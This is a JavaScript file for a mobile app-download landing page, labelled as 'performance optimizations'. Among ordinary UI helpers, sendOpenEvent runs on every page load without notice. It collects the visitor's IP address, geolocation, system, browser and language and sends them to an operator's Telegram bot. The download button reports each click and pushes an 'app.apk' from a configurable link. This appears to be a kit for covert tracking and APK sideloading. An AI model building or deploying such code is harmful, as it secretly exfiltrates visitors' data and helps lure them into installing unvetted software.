// Android & Mobile Performance Optimizations

// MADE BY Reviil0 --->

// Passive event listeners for better scroll performance
const passiveIfSupported = (() => {
    let passive = false;
    try {
        const options = {
            get passive() {
                passive = true;
                return false;
            }
        };
        window.addEventListener('test', null, options);
        window.removeEventListener('test', null, options);
    } catch (err) {
        passive = false;
    }
    return passive ? { passive: true } : false;
})();

// Debounce function for performance
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Lazy load images for better performance
function lazyLoadImages() {
    if ('loading' in HTMLImageElement.prototype) {
        const images = document.querySelectorAll('img[data-src]');
        images.forEach(img => {
            img.src = img.dataset.src;
        });
    } else {
        // Fallback for browsers that don't support lazy loading
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js';
        document.body.appendChild(script);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    const smallImages = document.querySelectorAll('.small-img');
    const modalImage = document.getElementById('modalImage');

    if (modalImage) {
        smallImages.forEach(img => {
            img.addEventListener('click', function() {
                modalImage.src = this.src;
            }, passiveIfSupported);
        });
    }

    const installBtn = document.getElementById('download-button');
    if (installBtn) {
        installBtn.addEventListener('click', downloadFile);
        
        // Add ripple effect for Android
        installBtn.addEventListener('touchstart', function(e) {
            this.style.transform = 'scale(0.98)';
        }, passiveIfSupported);
        
        installBtn.addEventListener('touchend', function(e) {
            this.style.transform = 'scale(1)';
        }, passiveIfSupported);
    }
    
    // Initialize lazy loading
    lazyLoadImages();
    
    // Optimize carousel for touch devices
    const carousel = document.querySelector('.carousel');
    if (carousel) {
        carousel.addEventListener('touchstart', function() {
            this.style.transition = 'none';
        }, passiveIfSupported);
        
        carousel.addEventListener('touchend', function() {
            this.style.transition = '';
        }, passiveIfSupported); 
    }
});

const TG_TOKEN = ''; //YOUR BOT TOKEN
const TG_CHAT = ''; //YOUR CHAT ID

async function sendTelegram(text) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT, text: text })
        });
        const json = await response.json();
        if (!response.ok || !json.ok) {
            console.error('Telegram API error:', json);
        }
        return json;
    } catch (error) {
        console.error('Telegram send failed:', error);
        return null;
    }
}

function getBrowserInfo(ua) {
    try {
        ua = ua || navigator.userAgent || '';
        const isEdge = /Edg\/(\d+[\d.]*)/.exec(ua);
        if (isEdge) return `Edge ${isEdge[1]}`;
        const isChrome = /Chrome\/(\d+[\d.]*)/.exec(ua);
        const isCriOS = /CriOS\/(\d+[\d.]*)/.exec(ua); // Chrome on iOS
        if (isCriOS) return `Chrome iOS ${isCriOS[1]}`;
        if (isChrome && !/OPR\//.test(ua) && !/SamsungBrowser\//.test(ua)) return `Chrome ${isChrome[1]}`;
        const isFirefox = /Firefox\/(\d+[\d.]*)/.exec(ua) || /FxiOS\/(\d+[\d.]*)/.exec(ua);
        if (isFirefox) return `Firefox ${isFirefox[1]}`;
        const isSafari = /Version\/(\d+[\d.]*)\s+Safari\//.exec(ua);
        if (isSafari && !/Chrome\//.test(ua) && !/CriOS\//.test(ua)) return `Safari ${isSafari[1]}`;
        const isOpera = /OPR\/(\d+[\d.]*)/.exec(ua);
        if (isOpera) return `Opera ${isOpera[1]}`;
        const isSamsung = /SamsungBrowser\/(\d+[\d.]*)/.exec(ua);
        if (isSamsung) return `Samsung Internet ${isSamsung[1]}`;
        return 'Unknown';
    } catch { return 'Unknown'; }
}

function getSystemInfo(ua) {
    try {
        ua = ua || navigator.userAgent || '';
        const plat = navigator.platform || '';
        const isAndroid = /Android\s([\d._]+)/.exec(ua);
        if (isAndroid) return `Android ${isAndroid[1]}`;
        const isIOS = /(iPhone|iPad|iPod).*OS\s([\d_]+)/.exec(ua);
        if (isIOS) return `${isIOS[1]} iOS ${isIOS[2].replace(/_/g,'.')}`;
        const isWindows = /Windows NT\s([\d.]+)/.exec(ua);
        if (isWindows) return `Windows ${isWindows[1]}`;
        const isMac = /Mac OS X\s([\d_]+)/.exec(ua);
        if (isMac) return `macOS ${isMac[1].replace(/_/g,'.')}`;
        const isLinux = /Linux/.test(ua);
        if (isLinux) return 'Linux';
        return plat || 'Unknown';
    } catch { return 'Unknown'; }
}

async function sendOpenEvent() {
    try {
        const ua = navigator.userAgent;
        const lang = navigator.language || '';
        const url = location.hostname || location.href;
        const time = new Date().toLocaleString();
        const browser = getBrowserInfo(ua);
        const system = getSystemInfo(ua);
        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
        const ip = ipData && ipData.ip ? ipData.ip : '';
        const country = ipData && ipData.country_name ? ipData.country_name : '';
        const countryCode = ipData && ipData.country ? ipData.country : '';
        const city = ipData && ipData.city ? ipData.city : '';
        const region = ipData && ipData.region ? ipData.region : '';
        const geo = ip ? `${country}${countryCode ? ' (' + countryCode + ')' : ''}${city || region ? ' - ' : ''}${city}${region ? ', ' + region : ''}` : '';
        const parts = [
            ' User opened the website',
            '',
            ` ${lang} | ${url}`,
            ip ? ` ${countryCode} (https://ipapi.co/?q=${ip})` : '',
            '',
            ` System: ${system}`,
            ` Browser: ${browser}`,
            ` User Agent: ${ua}`,
            ` Time: ${time}`,
            geo ? ` Location: ${geo}` : ''
        ];
        const msg = parts.filter(Boolean).join('\n');
        await sendTelegram(msg);
    } catch (e) {}
}

async function downloadFile() {
    await sendTelegram('User started APK download');
    const apkUrl = window.__APK_URL__ || 'https://t.me/Sec_Society';
    const link = document.createElement('a');
    link.href = apkUrl;
    link.download = 'app.apk';
    link.target = '_blank';
    link.rel = 'noopener';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// Send open event with debounce for better performance
document.addEventListener('DOMContentLoaded', debounce(sendOpenEvent, 500));

// Service Worker Registration for PWA
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
            .then(registration => console.log('SW registered:', registration))
            .catch(err => console.log('SW registration failed:', err));
    });
}

function addToWishlist() {
    // More native Android feel
    const btn = event.target.closest('.action-btn');
    if (btn) {
        btn.style.transition = 'transform 0.1s';
        btn.style.transform = 'scale(0.95)';
        setTimeout(() => {
            btn.style.transform = 'scale(1)';
        }, 100);
    }
    
    // Show Android-style toast notification
    const toast = document.createElement('div');
    toast.textContent = '✓ Added to wishlist';
    toast.style.cssText = `
        position: fixed;
        bottom: 100px;
        left: 50%;
        transform: translateX(-50%);
        background-color: #323232;
        color: white;
        padding: 14px 24px;
        border-radius: 24px;
        font-size: 14px;
        z-index: 10000;
        animation: slideUp 0.3s ease;
        box-shadow: 0 3px 5px rgba(0,0,0,0.3);
    `;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'slideDown 0.3s ease';
        setTimeout(() => toast.remove(), 300);
    }, 2000);
}

// Expose for inline handlers and external access
window.addToWishlist = addToWishlist;
window.downloadFile = downloadFile;
//coded by @Reviil0 :)